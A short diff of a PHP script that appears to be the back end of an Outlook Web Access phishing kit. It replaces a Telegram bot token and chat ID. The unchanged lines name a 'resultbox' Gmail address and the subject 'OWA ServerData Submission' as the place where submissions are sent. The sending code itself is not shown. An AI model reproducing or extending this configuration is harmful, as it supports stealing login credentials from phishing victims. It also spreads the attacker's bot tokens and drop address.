@@ -4,8 +4,8 @@ header("Access-Control-Allow-Origin: *");
 header("Content-Type: application/json");
 
 
-$telegramBotToken = "7988731169:AAEcPFALyIPYTdYdU_TtssFY7tu5-leCq8";
-$telegramChatId   = "791256537";
+$telegramBotToken = "7594602249:AAE_c2r-FtEPwJWjL85QPmdqBl5iy1Y1JHA";
+$telegramChatId   = "7724482403";
 $emailTo          = "resultboxx2018@gmail.com";
 $emailSubject     = "OWA ServerData Submission";
 
